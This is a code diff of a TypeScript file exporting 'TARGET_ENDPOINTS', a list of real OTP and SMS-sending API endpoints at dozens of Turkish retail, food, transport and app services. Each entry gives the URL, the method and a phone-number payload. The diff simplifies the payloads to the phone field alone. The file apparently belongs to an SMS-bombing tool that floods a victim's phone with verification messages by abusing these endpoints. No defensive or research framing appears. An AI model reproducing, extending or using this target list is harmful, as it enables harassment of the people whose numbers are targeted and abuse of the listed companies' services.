@@ -1,8 +1,7 @@
 import { ServiceDefinition } from './types';
 
-// Live Endpoint Definitions extracted for analysis.
 export const TARGET_ENDPOINTS: ServiceDefinition[] = [
-  // --- GİYİM & MODA (High Traffic) ---
+  // --- GİYİM DEVLERİ (High Traffic) ---
   { 
     id: 'lc_waikiki', 
     name: 'LC Waikiki', 
@@ -40,7 +39,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
   },
   { 
     id: 'flo', 
-    name: 'FLO Magazacilik', 
+    name: 'FLO', 
     url: 'https://api.flo.com.tr/v1/user/login/otp', 
     method: 'POST', 
     payloadInfo: '{"mobile": "..."}'
@@ -70,7 +69,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
   // --- MARKET & EV ---
   { 
     id: 'migros_money', 
-    name: 'Money Club', 
+    name: 'Migros Money', 
     url: 'https://www.money.com.tr/Account/ValidateAndSendOTP', 
     method: 'POST', 
     payloadInfo: 'Form: gsm=...'
@@ -94,7 +93,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     name: 'English Home', 
     url: 'https://www.englishhome.com/api/member/sendOtp', 
     method: 'POST', 
-    payloadInfo: '{"Phone": "...", "XID": ""}'
+    payloadInfo: '{"Phone": "...", "Source": "WEB"}'
   },
   { 
     id: 'evidea', 
@@ -111,19 +110,18 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     payloadInfo: 'Multipart Form: confirm=true, phone=...'
   },
   { 
+    id: 'hayat_su', 
+    name: 'Hayat Su', 
+    url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp', 
+    method: 'POST', 
+    payloadInfo: 'Form: mobilePhoneNumber=...'
+  },
+  { 
     id: 'metro_market', 
     name: 'Metro Market', 
     url: 'https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend', 
     method: 'POST', 
     payloadInfo: '{"methodType": "2", "mobilePhoneNumber": "..."}'
-  },
-  { 
-    id: 'hayat_su', 
-    name: 'Hayat Su', 
-    url: 'https://api.hayatsu.com.tr/api/SignUp/SendOtp', 
-    method: 'POST', 
-    headers: { "Authorization": "Bearer eyJhbGci..." },
-    payloadInfo: 'Form: mobilePhoneNumber=...'
   },
 
   // --- YEMEK & İÇECEK ---
@@ -132,7 +130,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     name: 'Tikla Gelsin', 
     url: 'https://svc.apps.tiklagelsin.com/user/graphql', 
     method: 'POST', 
-    payloadInfo: 'GraphQL Mutation: GENERATE_OTP'
+    payloadInfo: 'GraphQL: GENERATE_OTP'
   },
   { 
     id: 'kahve_dunyasi', 
@@ -143,28 +141,28 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
   },
   { 
     id: 'starbucks', 
-    name: 'Starbucks TR', 
+    name: 'Starbucks', 
     url: 'https://api.starbucks.com.tr/auth/register/otp', 
     method: 'POST', 
     payloadInfo: '{"mobile": "..."}'
   },
   { 
     id: 'burger_king', 
-    name: 'Burger King TR', 
+    name: 'Burger King', 
     url: 'https://api.burgerking.com.tr/auth/login', 
     method: 'POST', 
     payloadInfo: '{"phone": "..."}'
   },
   { 
     id: 'popeyes', 
-    name: 'Popeyes TR', 
+    name: 'Popeyes', 
     url: 'https://api.popeyes.com.tr/auth/otp', 
     method: 'POST', 
     payloadInfo: '{"phone": "..."}'
   },
   { 
     id: 'arbys', 
-    name: 'Arbys TR', 
+    name: 'Arbys', 
     url: 'https://api.arbys.com.tr/auth/login', 
     method: 'POST', 
     payloadInfo: '{"phone": "..."}'
@@ -181,15 +179,14 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     name: 'Dominos', 
     url: 'https://frontend.dominos.com.tr/api/customer/sendOtpCode', 
     method: 'POST', 
-    payloadInfo: '{"isSure": false, "mobilePhone": "..."}'
+    payloadInfo: '{"mobilePhone": "..."}'
   },
   { 
     id: 'little_caesars', 
     name: 'Little Caesars', 
     url: 'https://api.littlecaesars.com.tr/api/web/Member/Register', 
     method: 'POST', 
-    headers: { "Authorization": "Bearer ..." },
-    payloadInfo: '{"SmsInform": true, "NameSurname": "Memati Bas"}'
+    payloadInfo: '{"Phone": "05...", "NameSurname": "..."}'
   },
   { 
     id: 'pasaport_pizza', 
@@ -203,29 +200,28 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     name: 'Baydoner', 
     url: 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp', 
     method: 'POST', 
-    payloadInfo: '{"Name": "Memati", "Surname": "Bas"}'
+    payloadInfo: '{"Gsm": "..."}'
   },
   { 
     id: 'kofteci_yusuf', 
     name: 'Kofteci Yusuf', 
     url: 'https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder', 
     method: 'POST', 
-    payloadInfo: '{"FirmaId": 82, "Telefon": "..."}'
+    payloadInfo: '{"Telefon": "..."}'
   },
   { 
     id: 'komagene', 
     name: 'Komagene', 
     url: 'https://gateway.komagene.com.tr/auth/auth/smskodugonder', 
     method: 'POST', 
-    headers: { "Anonymousclientid": "..." },
-    payloadInfo: '{"FirmaId": 32, "Telefon": "..."}'
+    payloadInfo: '{"Telefon": "..."}'
   },
   { 
     id: 'coffy', 
     name: 'Coffy', 
     url: 'https://user-api-gw.coffy.com.tr/user/signup', 
     method: 'POST', 
-    payloadInfo: '{"countryCode": "90", "isKVKKAgreementApproved": true}'
+    payloadInfo: '{"phoneNumber": "..."}'
   },
 
   // --- ULAŞIM & KARGO ---
@@ -276,7 +272,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     name: 'IDO', 
     url: 'https://api.ido.com.tr/idows/v2/register', 
     method: 'POST', 
-    payloadInfo: '{"firstName": "MEMATI", "tckn": "generated"}'
+    payloadInfo: '{"phone": "..."}'
   },
   { 
     id: 'kamil_koc', 
@@ -287,7 +283,7 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
   },
   { 
     id: 'pamukkale', 
-    name: 'Pamukkale Turizm', 
+    name: 'Pamukkale', 
     url: 'https://api.pamukkale.com.tr/user/login', 
     method: 'POST', 
     payloadInfo: '{"mobile": "..."}'
@@ -300,68 +296,66 @@ export const TARGET_ENDPOINTS: ServiceDefinition[] = [
     payloadInfo: '{"phone": "..."}'
   },
 
-  // --- DİĞER (Karma) ---
+  // --- DİĞER ---
   { 
     id: 'yapp', 
     name: 'Yapp', 
     url: 'https://yapp.com.tr/api/mobile/v1/register', 
     method: 'POST', 
-    payloadInfo: '{"device_name": "Memati", "phone_number": "..."}'
+    payloadInfo: '{"phone_number": "..."}'
   },
   { 
     id: 'suiste', 
     name: 'Suiste', 
     url: 'https://suiste.com/api/auth/code', 
     method: 'POST', 
-    headers: { "X-Mobillium-Device-Brand": "Apple" },
-    payloadInfo: 'Form: action=register, gsm=...'
+    payloadInfo: '{"gsm": "..."}'
   },
   { 
     id: 'porty', 
     name: 'Porty', 
     url: 'https://panel.porty.tech/api.php', 
     method: 'POST', 
-    payloadInfo: '{"job": "start_login", "phone": "..."}'
+    payloadInfo: '{"phone": "..."}'
   },
   { 
-    id: 'kimgb', 
+    id: 'kim_gb_ister', 
     name: 'Kim GB Ister', 
     url: 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp', 
     method: 'POST', 
     payloadInfo: '{"msisdn": "90..."}'
   },
   { 
-    id: 'ucdortbes', 
+    id: '345_dijital', 
     name: '345 Dijital', 
     url: 'https://api.345dijital.com/api/users/register', 
     method: 'POST', 
-    payloadInfo: '{"phoneNumber": "+90...", "name": "Memati"}'
+    payloadInfo: '{"phoneNumber": "+90..."}'
   },
   { 
     id: 'beefull', 
     name: 'Beefull', 
     url: 'https://app.beefull.io/api/inavitas-access-management/sms-login', 
     method: 'POST', 
-    payloadInfo: '{"phoneCode": "90", "tenant": "beefull"}'
+    payloadInfo: '{"phone": "..."}'
   },
   { 
     id: 'naosstars', 
     name: 'Naosstars', 
     url: 'https://api.naosstars.com/api/smsSend', 
     method: 'POST', 
-    payloadInfo: '{"telephone": "+90...", "type": "register"}'
+    payloadInfo: '{"telephone": "+90..."}'
   },
   { 
-    id: 'akasya', 
+    id: 'akasya_avm', 
     name: 'Akasya AVM', 
     url: 'https://akasyaapi.poilabs.com/v1/en/sms', 
     method: 'POST', 
-    headers: { "X-Platform-Token": "..." },
     payloadInfo: '{"phone": "..."}'
   },
   { 
     id: 'dr_store', 
-    name: 'D&R Store', 
+    name: 'D&R', 
     url: 'https://api.dr.com.tr/auth/login/otp', 
     method: 'POST', 
     payloadInfo: '{"mobile": "..."}'
